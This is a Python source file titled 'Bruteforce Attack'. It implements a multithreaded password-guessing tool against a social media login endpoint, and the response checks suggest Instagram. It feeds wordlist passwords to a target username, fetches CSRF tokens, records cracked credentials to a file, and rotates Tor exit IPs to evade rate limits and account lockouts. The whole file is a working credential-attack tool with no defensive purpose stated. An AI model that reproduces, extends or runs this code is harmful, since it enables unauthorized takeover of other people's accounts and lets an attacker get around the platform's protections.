# Date: 11/19/2017
# Author: Ethical-H4CK3R
# Description: Bruteforce Attack

import socks
import socket
from constants import *
from queue import Queue
from spyder import Spyder
from time import time, sleep
from threading import Thread, Lock
from tor import tor_restart, tor_is_active

class Bruteforce(Spyder):

 def __init__(self, username, wordlist):

  # counters
  self.threads = 0
  self.attempts = 0 # attempts made
  self.proxy_usage = 0 # incremented each time a proxy used
  self.proxy_fails = 0 # amount of times a proxy failed
  self.max_threads = max_threads_usage 
  
  # string constants
  self.wordlist = wordlist # password file
  self.username = username # the target account
  self.site = site_details # contains details of the targeted site

  # temporary storage
  self.proxies = Queue(proxies_max_size_) # a dynamic proxy list of recent proxies
  self.passlist = Queue(passlist_max_size) # passwords; prevents duplicates within the same queue

  # indicators
  self.ip = None
  self.pwd = None # for public access
  self.msg = None # the msg that is display when attack is over
  self.lock = Lock()
  self.session = None # the session object
  self.reading = False # reading the wordlist
  self.is_alive = False
  self.is_found = False
  self.retrieve = False # retrieve session's attempts from database
  self.session_updated = False 

  super(Bruteforce, self).__init__()

 def login(self, password):
  try:
   home_url = self.site['home_url']
   login_url = self.site['login_url']
   username_field = self.site['username_field']
   password_field = self.site['password_field']

   br = self.br
   self.threads += 1
   self.pwd = password
   self.proxy_usage += 1

   data = {username_field: self.username, password_field: password}
   br.headers.update({'X-CSRFToken': br.get(home_url).cookies.get_dict()['csrftoken']})

   # attempt login
   response = br.post(login_url, data=data).json()

   # validate
   if 'authenticated' in response:
    if response['authenticated']:
      self.save_cred(password)
      self.msg = '\nPassword: {}{}{}'.format(colors['green'], password, colors['white'])
   elif 'message' in response:
    if response['message'] == 'checkpoint_required':
      self.save_cred(password)
      self.msg = '\nPassword: {}{}{}'.format(colors['green'], password, colors['white'])
    elif response['status'] == 'fail': # account got locked
      if self.threads > 0:
         with self.lock:self.threads -= 1
      return
    else:pass 
   else:pass 
   
   with self.lock:
    if password in self.passlist.queue:
     if not self.is_found:self.attempts += 1
     self.passlist.queue.pop(self.passlist.queue.index(password)) # remove the password from queue
    if all([not self.is_found, self.is_alive, not self.attempts%session_save_time]):self.session_write()

  except KeyboardInterrupt:self.kill()
  except:self.proxy_fails += 1
  finally:
    if self.threads > 0:
     with self.lock:self.threads -= 1

 def session_write(self):
  if self.is_alive:
   if self.session_updated:return 

  queue = self.passlist.queue
  self.session_updated = True
  queue = str(queue) if queue else None
  self.session.update(queue, self.attempts)

 def save_cred(self, pwd):
   creds = 'Username: {}\nPassword: {}\n\n'.format(self.username, pwd)
   with open(credentials, 'a') as f:f.write(creds)

 def attack(self):
  while all([not self.is_found, self.is_alive]):
   try:

    # check if proxy is set
    if not self.ip:
     self.restart_tor()
     if not self.ip:continue

    # enable session modification
    self.session_updated = False
    
    # try all the passwords in the queue
    for pwd in self.passlist.queue:
     if self.threads >= self.max_threads:break
     if self.proxy_fails >= failures_max_size:break
     if self.proxy_usage >= proxy_total_usage:break
     if any([not self.is_alive, self.is_found]):break
     Thread(target=self.login, args=[pwd]).start()  
     
    # wait for threads 
    while all([not self.is_found, self.is_alive, self.threads>0, self.ip]):
     try:sleep(1)
     except:pass

    # renew IP 
    sleep(2)
    self.threads = 0
    self.restart_tor()
   except:pass

 def password_regulator(self):
  # reads the wordlist and append the passwords into the queue
  with open(self.wordlist, 'r') as wordlist:
   attempts = 0
   for pwd in wordlist:
    if any([not self.is_alive, self.is_found]):break

    if self.retrieve:
     if attempts < self.attempts:
      attempts += 1
      continue
     else:self.retrieve = False

    if self.passlist.qsize() < passlist_max_size:
     self.passlist.put(pwd.replace('\n', ''))
    else:
     while all([self.passlist.qsize(), not self.is_found, self.is_alive]):pass
     if all([not self.passlist.qsize(), not self.is_found, self.is_alive]):self.passlist.put(pwd)

  # done reading wordlist
  if self.is_alive:self.reading = False
  while all([not self.is_found, self.is_alive, self.passlist.qsize()]):
   try:sleep(1)
   except KeyboardInterrupt:break
  else:
   self.msg = '\nPassword: {}Not Found{}'.format(colors['red'], colors['white'])\
   if all([not self.msg, not self.reading]) else self.msg
   self.kill()

 def kill(self):
  self.is_alive = False
  if self.attempts>=passlist_max_size:self.session_write()
  if any([all([not self.passlist.qsize(), not self.reading]), self.is_found]):
   self.session.remove()

 def reset_proxy_counters(self):
  self.proxy_fails = 0
  self.proxy_usage = 0

 def restart_tor(self):
  tor_restart()
  self.reset_proxy_counters()
  self.renew_ip()

 def renew_ip(self):
  socks.socket.setdefaulttimeout(proxy_time_out)
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, tor_ip, tor_port, True)
  socket.socket = socks.socksocket
  self.ip = self.ip_addr

  if self.ip:
   if self.ip in self.proxies.queue:self.restart_tor()
   else:self.proxies.put(self.ip)

 def run(self):
  self.attempts = 0 if self.msg else self.attempts
  self.msg = None
  self.reading = True
  self.is_alive = True
  self.is_found = False
  Thread(target=self.password_regulator).start()
  self.attack()
  sleep(1.5)